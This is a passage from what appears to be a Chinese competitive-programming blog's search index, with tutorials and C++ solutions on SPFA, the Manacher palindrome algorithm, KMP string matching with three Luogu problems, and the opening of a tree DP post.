class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="comment">//printf(&quot;%d %d %d\n&quot;,u,v,w);</span></span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;<span class="built_in">max</span>(dis[u],w))&#123;</span><br><span class="line">                dis[v]=<span class="built_in">max</span>(dis[u],w);</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P1396_1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">spfa</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,dis[t]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 最短路径 </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>manacher的学习</title>
      <link href="/2022/02/18/manacher%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/18/manacher%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>今天学习一下新的字符串算法——manacher算法。</p><span id="more"></span><h2 id="manacher简介"><a href="#manacher简介" class="headerlink" title="manacher简介"></a>manacher简介</h2><blockquote><p><strong>最长回文子串</strong>（英语：<strong>Longest palindromic substring</strong>）是计算机科学中的问题，在一个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>中查找一个最长的连续的<a href="https://zh.wikipedia.org/wiki/%E5%9B%9E%E6%96%87">回文</a>的子串，例如“banana”最长回文子串是“anana”。最长回文子串并不一定是唯一的，比如在“abracadabra”中，没有超过3个字符的回文子串，但是有两个回文字符串长度都是3：“ada”和“aca”。在一些应用中，我们求出全部的极大回文子串（不被其他回文串包含的回文子串）。</p><p>Manacher于1975年发现了一种线性时间算法[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-1">1]</a>，可以在列出给定字符串中从任意位置开始的所有回文子串。并且，Apostolico, Breslauer &amp; Galil [<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-2">2]</a>发现，同样的算法也可以在任意位置查找全部极大回文子串，并且时间复杂度是线性的。因此，他们提供了一种时间复杂度为线性的最长回文子串解法。另外，Jeuring (1994)[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-3">3]</a>, Gusfield (1997)[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-4">4]</a>发现了基于后缀树的算法。也存在已知的高效并行算法。(from wiki)</p></blockquote><h2 id="manacher实现"><a href="#manacher实现" class="headerlink" title="manacher实现"></a>manacher实现</h2><p>实现起来的话，其实我个人认为是比较简单的。首先防止奇偶序列的问题，我们在所有的字符之间以及末尾添加<code>#</code>让它变成奇数，再在首尾分别添加<code>$</code>和<code>~</code>作为截至判断的区分。</p><p>我将变量做如下定义：</p><ul><li>$s$ ：所求字符串</li><li>$p[i]$ ：代表以字符 $s[i]$ 为中心的最长回文半径。即满足在 $0\le j\le p[i]$ 的条件下 $s[i+j]==s[i-j]$ 永远成立。</li><li>$wx$ ：目前所求的最远回文半径延伸的地方。即当前情况下的 $\max(i+p[i])$。  </li><li>$idx$ ：代表之前所求最远回文半径的中心。即取得wx时的 $i$ 的值。</li></ul><p>那么有了这个定义之后我们主要就是求这个p数组了，怎么求呢？</p><p>首先，如果我所在的位置在之前一个大的回文半径当中，那么我可以直接参考之前对称的那个位置上的p的值，比如下面这个例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a a a a b a a a a...</span><br><span class="line">    ↑   ↑   ↑   ↑</span><br><span class="line">    j idx   i   wx</span><br></pre></td></tr></table></figure><p>这种情况下，我们不难发现，$p[i]$ 至少是大于等于 $p[j]$ 的，如果省略号后面马上跟一个 $b$ 的话，那么它的 $p$ 的值可能会涨，但是我们就不用判断它周围两边相不相等了啊。如果多了，那么我比较的次数就更少了。但是呢，其实可以发现，我们管的范围只能到wx，多余wx我们肯定不敢保证数据完全对称可用，所以这里我们限制一下 $p[i]$ 最大可赋值为 $wx-i$ 即可。</p><p>所以我们的核心代码就是这样的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len2;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(mx&gt;i)&#123;</span><br><span class="line">        p[i]=<span class="built_in">min</span>(p[<span class="number">2</span>*idx-i],mx-i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">            p[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(new_s[i+p[i]]==new_s[i-p[i]])&#123;<span class="comment">//继续扩展看看有没有可能</span></span><br><span class="line">        p[i]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i+p[i]&gt;mx)&#123;    </span><br><span class="line">        mx=i+p[i];</span><br><span class="line">        idx=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 22000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> new_s[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> p[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    new_s[<span class="number">0</span>]=<span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">    new_s[<span class="number">1</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> len1=<span class="built_in">strlen</span>(s),len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;i++)&#123;</span><br><span class="line">        new_s[<span class="number">2</span>*i+<span class="number">3</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        new_s[<span class="number">2</span>*i+<span class="number">2</span>]=s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    len2=<span class="built_in">strlen</span>(new_s)+<span class="number">1</span>;</span><br><span class="line">    new_s[len2<span class="number">-1</span>]=<span class="string">&#x27;~&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> mx=<span class="number">0</span>,idx=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len2;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(mx&gt;i)&#123;</span><br><span class="line">            p[i]=<span class="built_in">min</span>(p[<span class="number">2</span>*idx-i],mx-i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            p[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(new_s[i+p[i]]==new_s[i-p[i]])&#123;</span><br><span class="line">            p[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i+p[i]&gt;mx)&#123;</span><br><span class="line">            mx=i+p[i];</span><br><span class="line">            idx=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len2;i++)&#123;</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 字符串 </category>
          
          <category> manacher </category>
          
          <category> 回文串 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法的学习</title>
      <link href="/2022/02/16/KMP%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/16/KMP%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>图论也挺难的，所以我选择复习一下字符串那些算法。</p><span id="more"></span><p>字符串算法第一个很重要的就是匹配了，也就是 $KMP$ 算法，这里的话主要就是计算模式串的 $Next$ 数组。那一位的 $Next$ 数组的值相当于这一位之前的字符串的最大相同前后缀长度。</p><p>比如 $baabaa$ 那么它的 $Next$ 数组分别是 $-1\ 0\ 0\ 0\ 1\ 2$ 。 </p><p>为什么最开始的那个是 $-1$ 呢，因为说了，当前的next所看的字符串是不包括当前字符的，所以第一个的next值所看的字符串其实是一个空串。并且我们可以想象一下，如果第一位它就不匹配，我要跳到哪？答案是模式串指针不跳，匹配串指针要跳。但是一般情况下失配是完全相反的，只有匹配的情况下j会往后跳，所以我们会把第一位失配和匹配的情况归为一类，或者是说特判一下第一位失配的情况，就让它跳到-1，如果跳到-1那么 $i++,j++$ 就好了。</p><p>那么接下来我们做一道模板匹配题。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>为了防止被说水博客，这里就放三题好了。</p><h3 id="洛谷P3375"><a href="#洛谷P3375" class="headerlink" title="洛谷P3375"></a><a href="https://www.luogu.com.cn/problem/P3375">洛谷P3375</a></h3><p>标板 $KMP$，只不过就是说，最后要那你输出一下模式串从开头到 $i$ 子串串的最长公共前后缀，这个跟 $Next$ 的数组还是有点区别的啊。$Next$ 的数组对应那一位是不包括这个字符的，所以这个输出的话从 $1$ 到 $n$ 输出就好了。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000006</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">char</span> mod_str[maxn];<span class="comment">//模式串</span></span><br><span class="line"><span class="keyword">int</span> kmp[maxn];<span class="comment">//next数组</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>,s,mod_str);</span><br><span class="line">    <span class="keyword">int</span> len1=<span class="built_in">strlen</span>(s),len2=<span class="built_in">strlen</span>(mod_str);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len1;i++)&#123;<span class="comment">//计算模式串的next数组</span></span><br><span class="line">        <span class="keyword">int</span> t=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(mod_str[t]!=mod_str[i]&amp;&amp;t)&#123;</span><br><span class="line">            t=kmp[t];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(mod_str[t]==mod_str[i])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=t+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kmp[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||s[i]==mod_str[j])&#123;<span class="comment">//匹配</span></span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            j=kmp[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==len2)&#123;<span class="comment">//输出答案</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i-j+<span class="number">1</span>);</span><br><span class="line">            j=kmp[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len2;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,kmp[i]);<span class="comment">//输出next数组</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="洛谷P4391"><a href="#洛谷P4391" class="headerlink" title="洛谷P4391"></a><a href="https://www.luogu.com.cn/problem/P4391">洛谷P4391</a></h3><p>就是看看一个字符串它是哪个子串循环构成的。</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aabaab</span><br></pre></td></tr></table></figure><p>他就能看成是 $aab$ 循环组成的一个字符串，但是。我们分析一下这样的字符串它的next数组看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 0 0 0 1 2 3</span><br></pre></td></tr></table></figure><p>这里为什么多出一个3，因为匹配完成之后还得跳失配指针。这里可能不明显，但是你多写几个就会发现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aabaabaabaabaabaabaabaabaabaab</span><br><span class="line">-1 0 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13……</span><br></pre></td></tr></table></figure><p>结果已经显而易见了，我只要取得最后的next值，然后拿n减去它就可以算出循环大小了。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005 </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> ss[maxn];</span><br><span class="line"><span class="keyword">int</span> kmp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P4391_3.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,ss);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(ss[i]!=ss[p]&amp;&amp;p)&#123;</span><br><span class="line">            p=kmp[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ss[i]==ss[p])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=p+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    for(int i=0;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">//        printf(&quot;%d &quot;,kmp[i]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n-kmp[n]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="洛谷P3435"><a href="#洛谷P3435" class="headerlink" title="洛谷P3435"></a><a href="https://www.luogu.com.cn/problem/P3435">洛谷P3435</a></h3><p>就是算出所有前缀的最长可表示周期，并且这个周期长度应该小于这个前缀。</p><p>这个怎么说呢，就是假如 $aaaaa$ 它会由哪个周期构成呢？结果有很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">aa</span><br><span class="line">aaa</span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure><p>以上都可以成为它的周期。</p><p>因为我们要找最长的所以说呢就选 $aaaa$ 。</p><p>但是有一种情况是例外的，就是 $aabaa$ 这个就有点不一样了，它看上去好像是 $aab$ 最大周期，但是它最大周期可以到 $aaba$ ，所以呢我们特判一下最后一个字符和第一个一不一样，一样就直接 $n-1$ 就-好了。</p><p>然后就是遍历整个 $next$ 数组。不过为了保证最长，我们还需要跳 $fail$，跳到不为0的时候即是最大周期，防止重复跳可以加一个优化，跳了之后直接把next值改掉，改成指向最终位置。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> kmp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(s[p]!=s[i]&amp;&amp;p)&#123;</span><br><span class="line">            p=kmp[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[p]==s[i])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=p+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kmp[i+<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[<span class="number">0</span>])&#123;</span><br><span class="line">                ans+=i;</span><br><span class="line">                <span class="comment">//printf(&quot;%d&#x27;s ans=%d\n&quot;,i,i);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">int</span> x=kmp[i+<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> q=i+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(kmp[x]!=<span class="number">0</span>)&#123;</span><br><span class="line">                    x=kmp[x];</span><br><span class="line">                &#125;</span><br><span class="line">                kmp[q]=x;</span><br><span class="line">                ans+=i-x+<span class="number">1</span>;</span><br><span class="line">                <span class="comment">//printf(&quot;%d&#x27;s ans=%d\n&quot;,i,i-x+1);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 字符串 </category>
          
          <category> KMP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>树形dp的学习</title>
      <link href="/2022/02/14/%E6%A0%91%E5%BD%A2dp%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/14/%E6%A0%91%E5%BD%A2dp%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>很烦啊，最近复习图论，贼艰难，很多题目基本多多少少都要用树形dp。而我专注于搞图论和数据结构，dp完全就是略知一二，逃避没有用，不会就去学，碰到困难就去面对。</p><span id="more"></span><p>树上dp其实跟普通的dp差不多，甚至会比普通的dp写起来简单，但是前提是要理解。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>洛谷<a href="https://www.luogu.com.cn/problem/P1352">P1352</a>这个真的是典中典了，我看几乎所有的技术博客都会拿这个当作树形dp的入门题，那我也不例外。</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>某大学有 $n$ 个职员，编号为 $1\ldots n$。</p><p>他们之间有从属关系，也就是说他们的关系就像一棵以校长为根的树，父结点就是子结点的直接上司。</p><p>现在有个周年庆宴会，宴会每邀请来一个职员都会增加一定的快乐指数 $r_i$，但是呢，如果某个职员的直接上司来参加舞会了，那么这个职员就无论如何也不肯来参加舞会了。</p><p>所以，请你编程计算，邀请哪些职员可以使快乐指数最大，求最大的快乐指数。</p><hr><p>其实我觉得这个跟有依赖的背包题有异曲同工之妙，不通的是，他们不是依赖，而是互斥，选了一个人之后则不能选另一个人。而依赖背包则是选了一个则必须选另外一个，当然另外一个没有这个限制，否则两个物品直接合并一个物品啦。</p><p>这里很明显就是 $n$ 个人 $n-1$ 对关系，可以算做一棵树，但是这棵树是有向的，最顶级的那个上司就是树根了。这里我们肯定得先建一个有向图来保存这个关系，然后我们需要自底向上分析策略。对于每一个叶子节点，它们没有下级，对他们来说只有参加或者不参加，这里我们设 $dp[i][0]$ 为第 $i$ 个人不来参加的最优解，$dp[i][1]$ 为第 $i$ 个人来参加的最优解，注意这个最优解是对于它以及它的所有子孙节点的最优解。我们假设节点 $i$ 有k个节点分别为 $a_1,a_2\dots a_k$ ，那么可以写出如下状态转移方程。 </p><p>$dp[i][1]  = \sum _{x=1} ^{k} dp[a_x][0]$</p><p>$dp[i][0]  = \sum _{x=1} ^{k} \max(dp[a_x][0],dp[a_x][1])$</p><p>这里很明显，对于本人不参加，那么自己的下属可参加可不参加，但是自己参加了自己的下属一定不能参加，而自己不参加选择下属参加还是不参加也是选取最优结果的，因此能得到上面的状态转移方程。然后就是最基本的树的操作了：建边，找根，dfs，状态转移，最后结果就是 $\max(dp[root][1],dp[root][0])$，所以这道题是真的入门题。</p><h4 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h4><figure class="highlight c++"><table><tr><td 